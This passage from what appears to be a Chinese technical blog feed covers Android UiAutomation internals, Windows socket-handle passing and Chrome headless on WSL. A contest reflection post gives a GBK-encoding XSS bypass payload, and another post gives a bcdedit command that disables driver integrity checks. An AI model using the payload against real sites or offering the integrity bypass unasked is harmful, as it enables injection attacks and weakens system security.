private void registerUiTestAutomationServiceLocked(IAccessibilityServiceClient client) {
    IAccessibilityManager manager = IAccessibilityManager.Stub.asInterface(
            ServiceManager.getService(Context.ACCESSIBILITY_SERVICE));
    AccessibilityServiceInfo info = new AccessibilityServiceInfo();
    info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
    info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
    info.flags |= AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
    info.setCapabilities(AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT
            | AccessibilityServiceInfo.CAPABILITY_CAN_REQUEST_TOUCH_EXPLORATION
            | AccessibilityServiceInfo.CAPABILITY_CAN_REQUEST_ENHANCED_WEB_ACCESSIBILITY
            | AccessibilityServiceInfo.CAPABILITY_CAN_REQUEST_FILTER_KEY_EVENTS);
    try {
        // Calling out with a lock held is fine since if the system
        // process is gone the client calling in will be killed.
        manager.registerUiTestAutomationService(mToken, client, info);
        mClient = client;
    } catch (RemoteException re) {
        throw new IllegalStateException(&quot;Error while registering UiTestAutomationService.&quot;, re);
    }
}
</code></pre>
<p>UiAutomationConnection.connect函数接着调用了registerUiTestAutomationServiceLocked(client)，而registerUiTestAutomationServiceLocked主要是调用了<code>IAccessibilityManager</code>的<code>registerUiTestAutomationService</code>注册了一个Accessibility服务。</p>
<p>由此可见，UiAutomation最终也是使用了AccessibilityManagerService。</p>
<h2 id="0x02-如何使用UiAutomation"><a href="#0x02-如何使用UiAutomation" class="headerlink" title="0x02 如何使用UiAutomation"></a>0x02 如何使用UiAutomation</h2><p>UiAutomator的常见使用方式是调用uiautomator命令，或是将<code>uiautomator.jar</code>导入到自己的工程中。为了更加自由地使用UiAutomation提供的能力，可以考虑直接创建UiAutomation对象实例使用。由于UiAutomation的构造函数以及其它一些重要方法设置了<code>@hide</code>，因此无法直接使用，需要用反射的方式获取。</p>
<pre><code class="java">Object connection = null;
HandlerThread mHandlerThread = new HandlerThread(&quot;UiAutomationThread&quot;);
mHandlerThread.start();
try{
    Class&lt;?&gt; UiAutomationConnection = Class.forName(&quot;android.app.UiAutomationConnection&quot;);
    Constructor&lt;?&gt; newInstance = UiAutomationConnection.getDeclaredConstructor();
    newInstance.setAccessible(true);
    connection = newInstance.newInstance();
    Class&lt;?&gt; IUiAutomationConnection = Class.forName(&quot;android.app.IUiAutomationConnection&quot;);
    Constructor&lt;?&gt; newUiAutomation = UiAutomation.class.getDeclaredConstructor(Looper.class, IUiAutomationConnection);
    UiAutomation mUiAutomation = (UiAutomation)newUiAutomation.newInstance(mHandlerThread.getLooper(), connection);
    Method connect = UiAutomation.class.getDeclaredMethod(&quot;connect&quot;);
    connect.invoke(mUiAutomation);
    Log.i(TAG, &quot;&quot;+mUiAutomation);
    mUiAutomation.waitForIdle(1000, 1000 * 10);
    AccessibilityNodeInfo nodeInfo = mUiAutomation.getRootInActiveWindow();
    Log.i(TAG, &quot;&quot;+nodeInfo);
}catch(Exception e){
    e.printStackTrace();
    return;
}
</code></pre>
<p>这是一段最简单的使用代码，编译到apk里面，运行后报错了。</p>
<pre><code>Caused by: java.lang.SecurityException: You do not have android.permission.RETRIEVE\_WINDOW_CONTENT required to call registerUiTestAutomationService from pid=3676, uid=10040  
     at android.os.Parcel.readException(Parcel.java:1599)  
     at android.os.Parcel.readException(Parcel.java:1552)  
     at android.view.accessibility.IAccessibilityManager$Stub$Proxy.registerUiTestAutomationService  (IAccessibilityManager.java:352)  
     at android.app.UiAutomationConnection.registerUiTestAutomationServiceLocked(UiAutomationConnection.java:337)  
     at android.app.UiAutomationConnection.connect(UiAutomationConnection.java:89)  
     at android.app.UiAutomation.connect(UiAutomation.java:197)  
</code></pre><p>看来是需要<code>android.permission.RETRIEVE_WINDOW_CONTENT</code>权限，尝试将该权限添加到AndroidManifest.xml中，但是提示这个是系统权限，普通应用不能申请。因此，应用中不能使用UiAutomation的，同时发现，编译为jar包后使用<code>shell</code>权限执行，是可以正常跑过的。这也是为什么uiautomator工具可以正常运行的原因。</p>
<h2 id="0x03-AccessibilityManagerService"><a href="#0x03-AccessibilityManagerService" class="headerlink" title="0x03 AccessibilityManagerService"></a>0x03 AccessibilityManagerService</h2><p>如前所述，UiAutomation底层使用的还是AccessibilityManagerService，这里简单分析一下AccessibilityManagerService的实现。</p>
<p>该类内部包含了一个Service类：</p>
<pre><code class="java">/**
    * This class represents an accessibility service. It stores all per service
    * data required for the service management, provides API for starting/stopping the
    * service and is responsible for adding/removing the service in the data structures
    * for service management. The class also exposes configuration interface that is
    * passed to the service it represents as soon it is bound. It also serves as the
    * connection for the service.
    */
class Service extends IAccessibilityServiceConnection.Stub implements ServiceConnection, DeathRecipient;
</code></pre>
<p>从描述上看，每个Service实例代表了一个Accessibility服务，同时它实现了ServiceConnection接口，因此它也是一个Service客户端。</p>
<p>Service类中定义了一个bool类型的变量<code>mIsAutomation</code>，表示当前服务是否是UiAutomation。在AccessibilityManagerService的registerUiTestAutomationService方法中，将当前服务的组件名称设置为sFakeAccessibilityServiceComponentName，而mIsAutomation就是通过组件名称来判断是否是UiAutomation。</p>
<pre><code class="java">accessibilityServiceInfo.setComponentName(sFakeAccessibilityServiceComponentName);

mIsAutomation = (sFakeAccessibilityServiceComponentName.equals(componentName));
</code></pre>
<p>由于UiAutomation与AccessibilityService实现方式不同，因此，AccessibilityManagerService在很多地方都会根据mIsAutomation执行不同的逻辑。</p>
<p>根据前面的分析，在UiAutomation发起connect请求后，会进入AccessibilityManagerService的registerUiTestAutomationService。然后经过一系列的函数调用，进到Service的<code>bindLocked</code>函数。</p>
<pre><code class="java">/**
    * Binds to the accessibility service.
    *
    * @return True if binding is successful.
    */
public boolean bindLocked() {
    UserState userState = getUserStateLocked(mUserId);
    if (!mIsAutomation) {
        if (mService == null &amp;&amp; mContext.bindServiceAsUser(
                mIntent, this,
                Context.BIND_AUTO_CREATE | Context.BIND_FOREGROUND_SERVICE_WHILE_AWAKE,
                new UserHandle(mUserId))) {
            userState.mBindingServices.add(mComponentName);
        }
    } else {
        userState.mBindingServices.add(mComponentName);
        mService = userState.mUiAutomationServiceClient.asBinder();
        mMainHandler.post(new Runnable() {
            @Override
            public void run() {
                // Simulate asynchronous connection since in onServiceConnected
                // we may modify the state data in case of an error but bind is
                // called while iterating over the data and bad things can happen.
                onServiceConnected(mComponentName, mService);
            }
        });
        userState.mUiAutomationService = this;
    }
    return false;
}
</code></pre>
<p>bindLocked会发送一个异步消息，调到<code>onServiceConnected</code>回调。</p>
<pre><code class="java">@Override
public void onServiceConnected(ComponentName componentName, IBinder service) {
    synchronized (mLock) {
        mService = service;
        mServiceInterface = IAccessibilityServiceClient.Stub.asInterface(service);
        UserState userState = getUserStateLocked(mUserId);
        addServiceLocked(this, userState);
        if (userState.mBindingServices.contains(mComponentName) || mWasConnectedAndDied) {
            userState.mBindingServices.remove(mComponentName);
            mWasConnectedAndDied = false;
            try {
                mServiceInterface.init(this, mId, mOverlayWindowToken);
                onUserStateChangedLocked(userState);
            } catch (RemoteException re) {
                Slog.w(LOG_TAG, &quot;Error while setting connection for service: &quot;
                        + service, re);
                binderDied();
            }
        } else {
            binderDied();
        }
    }
}
</code></pre>
<p>这里的<code>mServiceInterface</code>其实就是UiAutomation构造函数中实例化的mClient的远程对象。接着，调用了IAccessibilityServiceClient的init函数，该函数的实现位于AccessibilityService.IAccessibilityServiceClientWrapper类中。</p>
<pre><code class="java">public void init(IAccessibilityServiceConnection connection, int connectionId,
        IBinder windowToken) {
    Message message = mCaller.obtainMessageIOO(DO_INIT, connectionId,
            connection, windowToken);
    mCaller.sendMessage(message);
}

case DO_INIT: {
    mConnectionId = message.arg1;
    SomeArgs args = (SomeArgs) message.obj;
    IAccessibilityServiceConnection connection =
            (IAccessibilityServiceConnection) args.arg1;
    IBinder windowToken = (IBinder) args.arg2;
    args.recycle();
    if (connection != null) {
        AccessibilityInteractionClient.getInstance().addConnection(mConnectionId,
                connection);
        mCallback.init(mConnectionId, windowToken);
        mCallback.onServiceConnected();
    } else {
        AccessibilityInteractionClient.getInstance().removeConnection(
                mConnectionId);
        mConnectionId = AccessibilityInteractionClient.NO_ID;
        AccessibilityInteractionClient.getInstance().clearCache();
        mCallback.init(AccessibilityInteractionClient.NO_ID, null);
    }
} return;
</code></pre>
<p>这样，初始化完成后，AccessibilityInteractionClient实例中保存了IAccessibilityServiceConnection实例，而AccessibilityManagerService中对应的Service对象中也保存了IAccessibilityServiceClient实例，从而建立起双向的Binder通信。</p>
<p>在发生Accessibility事件后，AccessibilityManagerService会通过IAccessibilityServiceConnection的onAccessibilityEvent方法将事件通知给UiAutomation。</p>
<h2 id="0x04-UiAutomator与AccessibilityService"><a href="#0x04-UiAutomator与AccessibilityService" class="headerlink" title="0x04 UiAutomator与AccessibilityService"></a>0x04 UiAutomator与AccessibilityService</h2><p>AccessibilityService是一个继承自Service的抽象服务类，用户在使用时需要实现一个自己的子类。该类很大程度上依赖于AccessibilityInteractionClient类提供的接口，AccessibilityInteractionClient类内部保存了一个静态的<code>LongSparseArray&lt;AccessibilityInteractionClient&gt; sClients</code>对象，用来实现线程相关的单例对象。</p>
<pre><code class="java">/**
    * @return The client for the current thread.
    */
public static AccessibilityInteractionClient getInstance() {
    final long threadId = Thread.currentThread().getId();
    return getInstanceForThread(threadId);
}

/**
    * &lt;strong&gt;Note:&lt;/strong&gt; We keep one instance per interrogating thread since
    * the instance contains state which can lead to undesired thread interleavings.
    * We do not have a thread local variable since other threads should be able to
    * look up the correct client knowing a thread id. See ViewRootImpl for details.
    *
    * @return The client for a given &lt;code&gt;threadId&lt;/code&gt;.
    */
public static AccessibilityInteractionClient getInstanceForThread(long threadId) {
    synchronized (sStaticLock) {
        AccessibilityInteractionClient client = sClients.get(threadId);
        if (client == null) {
            client = new AccessibilityInteractionClient();
            sClients.put(threadId, client);
        }
        return client;
    }
}
</code></pre>
<p>前面提到，AccessibilityInteractionClient对象中保存了IAccessibilityServiceConnection实例，因此，可以调用该接口提供的功能。</p>
<pre><code class="java">/**
    * Interface given to an AccessibilitySerivce to talk to the AccessibilityManagerService.
    *
    * @hide
    */
interface IAccessibilityServiceConnection {

    void setServiceInfo(in AccessibilityServiceInfo info);

    boolean findAccessibilityNodeInfoByAccessibilityId(int accessibilityWindowId,
        long accessibilityNodeId, int interactionId,
        IAccessibilityInteractionConnectionCallback callback, int flags, long threadId);

    boolean findAccessibilityNodeInfosByText(int accessibilityWindowId, long accessibilityNodeId,
        String text, int interactionId, IAccessibilityInteractionConnectionCallback callback,
        long threadId);

    boolean findAccessibilityNodeInfosByViewId(int accessibilityWindowId,
        long accessibilityNodeId, String viewId, int interactionId,
        IAccessibilityInteractionConnectionCallback callback, long threadId);

    boolean findFocus(int accessibilityWindowId, long accessibilityNodeId, int focusType,
        int interactionId, IAccessibilityInteractionConnectionCallback callback, long threadId);

    boolean focusSearch(int accessibilityWindowId, long accessibilityNodeId, int direction,
        int interactionId, IAccessibilityInteractionConnectionCallback callback, long threadId);

    boolean performAccessibilityAction(int accessibilityWindowId, long accessibilityNodeId,
        int action, in Bundle arguments, int interactionId,
        IAccessibilityInteractionConnectionCallback callback, long threadId);

    AccessibilityWindowInfo getWindow(int windowId);

    List&lt;AccessibilityWindowInfo&gt; getWindows();

    AccessibilityServiceInfo getServiceInfo();

    boolean performGlobalAction(int action);

    oneway void setOnKeyEventResult(boolean handled, int sequence);
}
</code></pre>
<p>与UiAutomation不同的是，AccessibilityService的初始化是和普通的Service一致的。由于AccessibilityService比较特殊的地方在于需要在设置的辅助功能里开启对应的服务，点击开启后，会执行到<code>BindService</code>逻辑，进而执行到AccessibilityService的<code>onBind</code>回调，并触发AccessibilityManagerService中Service的<code>onServiceConnected</code>回调。</p>
<pre><code class="java">/**
    * Implement to return the implementation of the internal accessibility
    * service interface.
    */
@Override
public final IBinder onBind(Intent intent) {
    return new IAccessibilityServiceClientWrapper(this, getMainLooper(), new Callbacks() {
        @Override
        public void onServiceConnected() {
            AccessibilityService.this.onServiceConnected();
        }

        @Override
        public void onInterrupt() {
            AccessibilityService.this.onInterrupt();
        }

        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {
            AccessibilityService.this.onAccessibilityEvent(event);
        }

        @Override
        public void init(int connectionId, IBinder windowToken) {
            mConnectionId = connectionId;
            mWindowToken = windowToken;

            // The client may have already obtained the window manager, so
            // update the default token on whatever manager we gave them.
            final WindowManagerImpl wm = (WindowManagerImpl) getSystemService(WINDOW_SERVICE);
            wm.setDefaultToken(windowToken);
        }

        @Override
        public boolean onGesture(int gestureId) {
            return AccessibilityService.this.onGesture(gestureId);
        }

        @Override
        public boolean onKeyEvent(KeyEvent event) {
            return AccessibilityService.this.onKeyEvent(event);
        }
    });
}
</code></pre>
<p>相对于UiAutomation只能在<code>shell</code>环境中执行，AccessibilityService是可以运行在app环境中的，但是需要用户手动开启服务会略显麻烦。</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>UiAutomator和AccessibilityService作为两种不同的实现形式，拥有各自的优缺点，这两年流行的抢红包工具基本也是基于这两种方式实现的。在自动化中使用它们也能起到一些辅助作用。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>uiautomator</tag>
        <tag>accessibilityservice</tag>
      </tags>
  </entry>
  <entry>
    <title>安全大赛有感</title>
    <url>/2017/01/07/web-security-thinking/</url>
    <content><![CDATA[<p>&emsp;&emsp;前几天参加了公司的安全大赛，其中有几题感觉本应该做出来，却没做出来，归根到底还是自己知识面太窄了。<br>&emsp;&emsp;1、找xss漏洞，onclick=\”addMsg(\’<em>\’)\”，</em>表示是参数中可以传入的内容，但是会有过滤，“\”，“\’”，“\””等字符前面会加上“\”，“\’”，“\””会被替换为html编码形式，网页是gbk编码的。<br>&emsp;&emsp;感觉应该是利用gbk编码的漏洞来绕过去，一般来说gbk编码漏洞都是利用GBK双字节中的第二个字符为“\”，如果server把“\”替换为“\\”，返回到浏览器时就变成一个汉字加一个“\”，可是不管怎么弄“\’”还是变成“&#39;”，没法将前面的“\’”闭合。<br>&emsp;&emsp;最后发现答案是：“%c0%5c%27);alert(1);//”，返回的html代码是：“onclick=\”addMsg(\’繺\\&#039;);alert(1);//\’)\””，如果这里还看不出问题的话，用chrome开发者工具看一下就会发现，解析后的html代码是：“onclick=\”addMsg(\’繺\\\’);alert(1);//\’)\””。  &#39;已经被还原成了“\’”，从而闭合了前面的“\’”，这一点我之前是不知道的，而且也没有用开发者工具看一下，这一点太失败了。我离成功真的只有一步之遥了！<br>&emsp;&emsp;有时间好好研究下什么情况下会还原，什么情况下不会还原！这些是原理层面的东西，可惜都不清楚啊！</p>
<p>&emsp;&emsp;2、传统的从一个页面找下一个页面的游戏，有一个页面是将秘密隐藏在了HTTP响应头中，可我一直都是在html代码中找线索，白白浪费了时间。下次遇到这类题目一定要立马开fiddler。这个失败主要还是思维定势，想问题一定要思路开阔，不能太死！！！</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>创建Python3虚拟环境失败问题跟进</title>
    <url>/2019/04/17/win10-python3-virtualenv/</url>
    <content><![CDATA[<h2 id="0x00-问题描述"><a href="#0x00-问题描述" class="headerlink" title="0x00 问题描述"></a>0x00 问题描述</h2><p>今天在Win10上遇到一个很诡异的问题，使用python3的<code>virtualenv</code>创建虚拟环境失败，报错如下：</p>
<pre><code>Using base prefix &#39;c:\\users\\xxx\\appdata\\local\\programs\\python\\python37&#39;
New python executable in D:\env\Scripts\python3.exe
Also creating executable in D:\env\Scripts\python.exe
ERROR: The executable D:\env\Scripts\python3.exe is not functioning
ERROR: It thinks sys.prefix is &#39;d:\\&#39; (should be &#39;d:\\env&#39;)
ERROR: virtualenv is not compatible with this system or executable
Note: some Windows users have reported this error when they installed Python for &quot;Only this user&quot; or have multiple versions of Python installed. Copying the appropriate PythonXX.dll to the virtualenv Scripts/ directory may fix this problem.
</code></pre><p>同时还会有如下弹窗：</p>
<p><img src="../images/python-0xc0000022.jpg" alt></p>
<h2 id="定位原因"><a href="#定位原因" class="headerlink" title="定位原因"></a>定位原因</h2><p>根据错误信息在网上寻找解决方法，有说是pythonxx.dll有问题，还有说是权限问题，但试了下都没法解决这个问题。因此，只能尝试在本地寻找复现规律。</p>
<p>发现将<code>python3.exe</code>复制到其它路径后都无法运行，报错与创建虚拟环境一致；而在另一台Win10机器上却没有这个问题。所以，看来原因应该是python环境有问题，但为什么默认路径运行却是正常的呢？</p>
<p>一开始以为是<code>python37.dll</code>的问题，但是很快又排除了。此时，发现python3安装目录下有个<code>vcruntime140.dll</code>文件，而这个文件是不会被复制到虚拟环境中的，难道是这个dll的问题？</p>
<p>将这个dll拷贝到虚拟环境目录后，果然python可以正常运行了。</p>
<p>因此确定，就是<code>vcruntime140.dll</code>这个文件的锅了。</p>
<h2 id="终极解决方案"><a href="#终极解决方案" class="headerlink" title="终极解决方案"></a>终极解决方案</h2><p>但是其它Win10上没有拷贝这个dll，也是正常的啊。所以，还需要进一步寻找原因。</p>
<p>接着，将正常电脑上python安装目录里的<code>vcruntime140.dll</code>文件删掉，运行python，也是正常的。使用<code>procexp</code>查看加载的dll，发现原来python会从<code>C:\Windows\system32</code>目录下加载该dll。</p>
<p>在有问题的电脑上看了下该目录，文件也是存在的啊，那是怎么回事呢？</p>
<p>右键查看文件属性，终于发现了根本原因，原来文件的权限设置有问题，估计这个dll是在入域前装上去的，导致只能在管理员权限下访问。</p>
<p>修改文件权限后，一切都正常了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据程序的报错信息不一定能正确地找到解决问题的方法，有时还是需要进一步跟踪调试，才能找到问题的真正原因。</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>win7系统64位&#92;&quot;禁用驱动程序签名强制&#92;&quot;</title>
    <url>/2017/01/07/win7-64-signature/</url>
    <content><![CDATA[<blockquote>
<p>bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS</p>
</blockquote>
<p>使用管理员的身份打开CMD命令行，然后输入上面的命令，完成之后重新启动计算机，就可以随时在Win7系统64位上使用未有数字签名的驱动程序了。</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>win7</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows中如何在父子进程间传递SOCKET句柄</title>
    <url>/2024/05/16/windows-dup-socket/</url>
    <content><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>Linux由于<code>一切皆文件</code>，不管是文件、管道，还是socket，都可以轻易在父子进程间传递；而Windows上会复杂很多。最近有个需求，需要进行父子进程间的通信，常见的方案是在创建子进程时通过<code>stdin</code>、<code>stdout</code>、<code>stderr</code>这三个句柄来传递管道句柄，从而达到父子进程间通信的目的。但这种方式最大的问题是：对子进程需要单独处理stdout和stderr，使用上有些限制。</p>
<p>经过调研之后，放弃了管道这种方式，因为匿名管道不支持异步读写，不符合我们的使用场景。然后，考虑将SOCKET句柄传递给子进程，进而进行通信。</p>
<h2 id="0x01-复制句柄"><a href="#0x01-复制句柄" class="headerlink" title="0x01 复制句柄"></a>0x01 复制句柄</h2><p>Windows中有一个复制句柄的API：<code>DuplicateHandle</code>。</p>
<pre><code class="c++">BOOL DuplicateHandle(
  [in]  HANDLE   hSourceProcessHandle,
  [in]  HANDLE   hSourceHandle,
  [in]  HANDLE   hTargetProcessHandle,
  [out] LPHANDLE lpTargetHandle,
  [in]  DWORD    dwDesiredAccess,
  [in]  BOOL     bInheritHandle,
  [in]  DWORD    dwOptions
);
</code></pre>
<p>参数含义如下：</p>
<ul>
<li><p>hSourceProcessHandle —— 源进程句柄</p>
</li>
<li><p>hSourceHandle —— 源句柄</p>
</li>
<li><p>hTargetProcessHandle —— 目标进程句柄</p>
</li>
<li><p>lpTargetHandle —— 新句柄指针</p>
</li>
<li><p>dwDesiredAccess —— 新句柄访问权限</p>
</li>
<li><p>bInheritHandle —— 句柄是否可继承</p>
</li>
<li><p>dwOptions —— 可选行为，取值为：<code>DUPLICATE_CLOSE_SOURCE</code>或<code>DUPLICATE_SAME_ACCESS</code></p>
</li>
</ul>
<p>使用这个函数，我们可以将当前进程的某个句柄复制到其它进程中，也可以将其它进程的某个句柄复制到当前进程中。因此，我们可以在父进程中创建一个socket对象，然后将句柄的id通过命令行参数传递给子进程；然后子进程将该句柄真正复制到当前进程，并转换成socket对象即可。</p>
<h2 id="0x02-具体代码"><a href="#0x02-具体代码" class="headerlink" title="0x02 具体代码"></a>0x02 具体代码</h2><h3 id="父进程"><a href="#父进程" class="headerlink" title="父进程"></a>父进程</h3><pre><code class="python">import socket
import subprocess

sock = socket.create_connection((&#39;www.qq.com&#39;, 80))
print(sock)


child_process = subprocess.Popen(
    [&quot;python&quot;, &quot;child.py&quot;, str(sock.fileno())],
)

child_process.wait()
</code></pre>
<h3 id="子进程"><a href="#子进程" class="headerlink" title="子进程"></a>子进程</h3><pre><code class="python">import _winapi
import os
import socket

def steal_handle(source_pid, handle):
    &#39;&#39;&#39;Steal a handle from process identified by source_pid.&#39;&#39;&#39;
    source_process_handle = _winapi.OpenProcess(
        _winapi.PROCESS_DUP_HANDLE, False, source_pid)
    try:
        return _winapi.DuplicateHandle(
            source_process_handle, handle,
            _winapi.GetCurrentProcess(), 0, False,
            _winapi.DUPLICATE_SAME_ACCESS | _winapi.DUPLICATE_CLOSE_SOURCE)
    finally:
        _winapi.CloseHandle(source_process_handle)


handle = steal_handle(os.getppid(), int(sys.argv[1]))
print(sys.argv[1], &quot;=&gt;&quot;, handle)

socks = socket.fromfd(handle, socket.AF_INET, socket.SOCK_STREAM)

print(socks)

socks.send(b&#39;GET / HTTP/1.1\r\n\r\n&#39;)
data = socks.recv(1024)
print(&quot;Received data:&quot;, data)
</code></pre>
<p><code>steal_handle</code>函数代码是从<code>multiprocessing</code>模块中复制过来的，它也是用了类似的原理进行句柄的传递。</p>
<p><code>socket.fromfd</code>是Windows端python 3.5以上提供的内置方法，也可以直接用<code>socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0, handle)</code>代替，差别只是没有再复制一个句柄出来。</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>利用DuplicateHandle函数，可以实现一些特殊的效果，具体可以参考：<a href="https://blog.51cto.com/u_15127650/3864848" target="_blank" rel="noopener">Windows核心编程 第三章 内核对象</a>。</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL运行Chrome Headless模式</title>
    <url>/2019/08/29/wsl-chrome-headless/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Google Chrome早就支持了<code>headless</code>模式，但一般都是在Linux上运行，而我则习惯于在<code>WSL</code>上开发，折腾了好久终于找到了可以在WSL上跑<code>headless</code>模式的方法。</p>
<p>以下以<code>WSL</code>中安装的是<code>Ubuntu 18.04</code>系统为例。</p>
<h2 id="常见安装方法"><a href="#常见安装方法" class="headerlink" title="常见安装方法"></a>常见安装方法</h2><h3 id="安装依赖库"><a href="#安装依赖库" class="headerlink" title="安装依赖库"></a>安装依赖库</h3><pre><code class="bash">$ sudo apt install gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator3-1 libnss3 lsb-release xdg-utils
</code></pre>
<h3 id="安装Chrome"><a href="#安装Chrome" class="headerlink" title="安装Chrome"></a>安装Chrome</h3><pre><code class="bash">$ wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
$ sudo dpkg -i google-chrome-stable_current_amd64.deb
$ which google-chrome
/usr/bin/google-chrome
</code></pre>
<h2 id="使用Chrome-Headless访问网页"><a href="#使用Chrome-Headless访问网页" class="headerlink" title="使用Chrome Headless访问网页"></a>使用Chrome Headless访问网页</h2><p>使用 <a href="https://developers.google.com/web/updates/2017/04/headless-chrome" target="_blank" rel="noopener">官方文档</a>的方法打开Chrome：</p>
<pre><code>$ google-chrome --headless --disable-gpu --screenshot https://www.baidu.com/
</code></pre><p>出现如下报错信息：</p>
<pre><code>Failed to move to new namespace: PID namespaces supported, Network namespace supported, but failed: errno = Permission denied
Failed to generate minidump.Illegal instruction (core dumped)

</code></pre><p>使用如下命令行也不行：</p>
<pre><code>$ google-chrome --no-sandbox --headless --no-gpu --disable-setuid-sandbox --screenshot http://www.baidu.com/

[0829/140949.035033:WARNING:gpu_process_host.cc(1188)] The GPU process has crashed 1 time(s)
[0829/140950.200613:WARNING:gpu_process_host.cc(1188)] The GPU process has crashed 2 time(s)
[0829/140951.306996:WARNING:gpu_process_host.cc(1188)] The GPU process has crashed 3 time(s)

</code></pre><p>增加<code>--single-process</code>参数后打印如下信息：</p>
<pre><code>[0829/141145.431580:ERROR:browser_main_loop.cc(584)] Failed to put Xlib into threaded mode.
[0829/141146.090239:INFO:headless_shell.cc(572)] Written to file screenshot.png.
</code></pre><p>虽然看起来有报错，但是的确生成网页截图了。</p>
<p><code>screenshot.png</code>显示如下：</p>
<p><img src="/images/chrome-headless-screenshot1.png" alt></p>
<p>看起来有两个问题：</p>
<ul>
<li>中文没有正确显示</li>
<li>窗口大小偏小</li>
</ul>
<p>中文显示的问题可以通过以下命令解决：</p>
<pre><code>$ sudo apt install fonts-noto-cjk
</code></pre><p>修改窗口大小可以通过增加<code>--window-size=1920,1080</code>参数进行修改。</p>
<p><img src="/images/chrome-headless-screenshot2.png" alt></p>
<h2 id="开启远程调试"><a href="#开启远程调试" class="headerlink" title="开启远程调试"></a>开启远程调试</h2><p><code>Headless</code>模式下一般需要通过Chrome远程调试协议进行访问。</p>
<p>命令行增加<code>--remote-debugging-port=9200</code>参数启动Chrome后，打印出以下信息：</p>
<pre><code>[0829/194236.072838:ERROR:browser_main_loop.cc(584)] Failed to put Xlib into threaded mode.

DevTools listening on ws://127.0.0.1:9200/devtools/browser/18442c9f-b0ee-4149-a16b-f49622047621
[0829/194236.299565:ERROR:command_buffer_proxy_impl.cc(107)] ContextResult::kTransientFailure: Shared memory region is not valid
</code></pre><p>看起来调试端口是启动成功了。</p>
<p>但是在访问调试页面后，Chrome进程<code>Crash</code>了。</p>
<pre><code>Segmentation fault (core dumped)
</code></pre><p>试了多个页面后发现，远程调试都会导致Crash，看来这条路不太好走。</p>
<h2 id="使用puppeteer提供的Chrome"><a href="#使用puppeteer提供的Chrome" class="headerlink" title="使用puppeteer提供的Chrome"></a>使用puppeteer提供的Chrome</h2><p>无意中发现，<code>puppeteer</code>中提供的Chrome竟然可以在WSL中开启调试端口并正常访问。</p>
<p>puppeteer默认下载地址的格式为：<code>https://storage.googleapis.com/chromium-browser-snapshots/${platform}/${revision}/chrome-${revision}.zip</code>。例如目前Linux上最新版本的URL为：<code>https://storage.googleapis.com/chromium-browser-snapshots/Linux_x64/674921/chrome-linux.zip</code></p>
<p>也可以使用镜像网站下载，例如：<code>https://npm.taobao.org/mirrors/chromium-browser-snapshots/</code>。</p>
<p>解压出来就可以直接用了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>安装依赖库，包括中文字体库</li>
<li>使用puppeteer提供的Chrome版本</li>
<li>完整的启动命令行：<code>chrome --no-sandbox --headless --no-gpu --disable-setuid-sandbox --single-process --window-size=1920,1080 --screenshot --remote-debugging-port=9200 http://www.baidu.com/</code></li>
</ul>
<p>顺便提供一下<code>puppeteer</code>使用的完整命令行：</p>
<pre><code>chrome --disable-background-networking --enable-features=NetworkService,NetworkServiceInProcess --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-features=site-per-process,TranslateUI,BlinkGenPropertyTrees --disable-hang-monitor --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-sync --force-color-profile=srgb --metrics-recording-only --no-first-run --enable-automation --password-store=basic --use-mock-keychain --headless --hide-scrollbars --mute-audio about:blank --no-sandbox --disable-setuid-sandbox --remote-debugging-port=0 --user-data-dir=/tmp/puppeteer_dev_profile-NkEdQ6
</code></pre>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>WSL</tag>
        <tag>Chrome</tag>
        <tag>headless</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL中部署nginx作为反向代理</title>
    <url>/2019/07/21/wsl-nginx/</url>
